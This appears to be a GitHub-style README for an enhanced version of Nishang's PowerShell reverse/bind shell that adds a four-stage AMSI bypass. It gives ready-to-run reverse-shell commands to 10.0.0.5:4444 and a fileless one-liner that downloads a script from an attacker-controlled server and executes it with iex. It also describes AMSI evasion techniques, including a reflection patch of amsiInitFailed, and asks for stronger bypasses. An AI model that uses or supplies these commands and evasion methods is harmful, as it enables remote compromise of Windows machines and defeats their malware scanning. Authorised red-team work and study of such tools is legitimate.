# Invoke-PowerShellTcp++ – Enhanced Reverse/Bind PowerShell Shell with Multi-Stage AMSI Bypass

A hardened, error-resilient version of the classic `Invoke-PowerShellTcp.ps1` from the **Nishang** framework.

This script maintains full backward compatibility while introducing several quality-of-life and defensive improvements.

---

## 🚀 Key Improvements over the Original

- ✅ **Multi-stage AMSI bypass** – Four different bypass techniques are tried sequentially, increasing reliability in modern Windows environments.
- ✅ **True error reporting** – All errors, including permission-denied, syntax errors, and command not-found, are sent back to the client exactly as they appear in a local PowerShell console.
- ✅ **UTF-8 encoding** – Unicode characters are properly transmitted, preserving accents, symbols, and special characters.
- ✅ **Optimised buffer** – Reduced from 64 KB to 8 KB, preventing unnecessary memory consumption while retaining full command execution.
- ✅ **Corrected bind shell listener** – The bind shell now works as expected, since the original had a casting error.
- ✅ **Prompt standardisation** – Consistent `PS <path> > ` with a trailing space, avoiding duplicated prompts.
- ✅ **Verbose output** – Optional `-Verbose` switch for debugging the connection and bypass attempts.
- ✅ **Better resource cleanup** – Uses `finally`-like logic to ensure sockets are always closed, even on errors.

---

## 🧬 Original Credit

This script is a **direct evolution** of the legendary `Invoke-PowerShellTcp.ps1` from the [Nishang](https://github.com/samratashok/nishang) framework by Nikhil Mittal, also known as [@samratashok](https://github.com/samratashok).

Nishang itself was inspired by **Powerfun**, written by **Ben Turner** and **Dave Hardy**.

---

## 📦 Usage

### Reverse Shell

Most common usage:

```powershell
expl_win -Reverse -IPAddress 10.0.0.5 -Port 4444
```

### Bind Shell

Listener mode:

```powershell
expl_win -Bind -Port 8888
```

### With Verbose Output

```powershell
expl_win -Reverse -IPAddress 10.0.0.5 -Port 4444 -Verbose
```

---

## 💻 One-Liner Deployment

To deploy the script without touching disk, host it on a web server and run:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://yourserver/expl_win.ps1'); expl_win -Reverse -IPAddress 10.0.0.5 -Port 4444
```

This technique is identical to the original Nishang deployment method.

---

## 🛡️ Multi-Stage AMSI Bypass

The script executes four independent AMSI bypass techniques in order. If one fails, it automatically proceeds to the next:

1. **Base64 Unicode patch** – Uses reflection to set `amsiInitFailed` to `$true`.
2. **String splitting and environment variables** – Classic Nishang-style obfuscation.
3. **`echo` plus string formatting** – Another obfuscated variation.
4. **Loop through types and fields** – A quieter, reflection-based technique that avoids hardcoded strings.

If all four fail, a warning is issued, but the shell continues. The AMSI bypass is a best-effort improvement.

---

## 🔧 Dependencies

- Windows PowerShell 5.1 or PowerShell 7+.
- Cross-platform support is experimental.
- .NET Framework 4.5+.
- No external tools.
- Pure PowerShell.
- Single file.

---

## ⚖️ Legal and Ethical Disclaimer

This script is provided exclusively for educational purposes, authorised penetration testing, and red teaming engagements.

Unauthorised use against systems you do not own or have explicit written permission to test is illegal and unethical.

The authors assume no liability for any misuse of this tool.

---

## 🤝 Contributing

Found a bug? Have an idea for an even more reliable AMSI bypass?

Open an issue or submit a pull request. All improvements that preserve the original `Invoke-PowerShellTcp` syntax are welcome.

---

## 📚 Additional Resources

- [Nishang – Official Repository](https://github.com/samratashok/nishang)
- Week of PowerShell Shells – Day 1
- Powerfun – Original Ben Turner and Dave Hardy script

